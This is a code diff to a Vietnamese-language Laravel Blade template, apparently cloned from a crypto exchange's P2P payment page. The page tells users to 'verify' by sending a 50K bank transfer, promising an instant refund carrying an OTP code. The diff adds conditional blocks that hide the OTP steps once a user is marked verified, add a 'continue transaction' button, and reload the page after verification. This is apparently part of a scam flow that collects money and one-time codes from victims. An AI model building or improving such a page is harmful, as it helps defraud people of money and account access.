@@ -139,13 +139,13 @@
                                         <div class="css-1tr0qpm">
                                             <div class="css-ot2ytd">
                                                 <div data-bn-type="text" class="css-4q9gwc theme--text">Thanh toán</div>
-                                                <div data-bn-type="text" class="css-1dmj7t7 theme--text">Xác minh bằng chuyển khoản
-                                                    ngân
-                                                    hàng 50K: Bạn sẽ được hoàn tiền ngay lập tức kèm mã OTP xác minh trong
-                                                    nội
-                                                    dung.
-                                                    Thời gian hoàn thành là ngay tức thì sau khi bạn nhập mã OTP.<div
-                                                        class="css-1f9551p"><svg xmlns="http://www.w3.org/2000/svg"
+                                                <div data-bn-type="text" class="css-1dmj7t7 theme--text">
+                                                    @if (!isset($verified))
+                                                    Xác minh bằng chuyển khoản ngân hàng 50K: Bạn sẽ được hoàn tiền ngay lập tức kèm mã OTP xác minh trong nội dung. Thời gian hoàn thành là ngay tức thì sau khi bạn nhập mã OTP.
+                                                    @else
+                                                    Xác minh bằng chuyển khoản ngân hàng 50K: Bạn sẽ được hoàn tiền ngay lập tức.
+                                                    @endif
+                                                    <div class="css-1f9551p"><svg xmlns="http://www.w3.org/2000/svg"
                                                             viewBox="0 0 24 24" fill="none" class="css-1pp0nin">
                                                             <path fill-rule="evenodd" clip-rule="evenodd"
                                                                 d="M12 21a9 9 0 100-18 9 9 0 000 18zM10.75 8.5V6h2.5v2.5h-2.5zm0 9.5v-7h2.5v7h-2.5z"
@@ -273,6 +273,7 @@
                                             </div>
                                         </div>
                                     </div>
+                                    @if (!isset($verified))
                                     <div class="css-4cffwv">
                                         <div class="css-1g9n4q8">
                                             <div class="css-1o6lork">3</div>
@@ -321,6 +322,10 @@
                                             </div>
                                         </div>
                                     </div>
+                                    @endif
+                                    @if (isset($verified))
+                                    <a class="mt-5 btn btn-primary btn-outline-secondary btn-verify" href="{{ route('transaction') }}">Tiếp tục giao dịch</a>
+                                    @endif
                                 </div>
 
                             </div>
@@ -351,6 +356,7 @@
                         if (response.verified) {
                             $('#bank-otp-wrapper').addClass('d-none');
                             $('.verify-status').text(response.message);
+                            window.location.reload();
                             return clearInterval(intervalCheckSendOtp)
                         }
                         if (response.sent) {
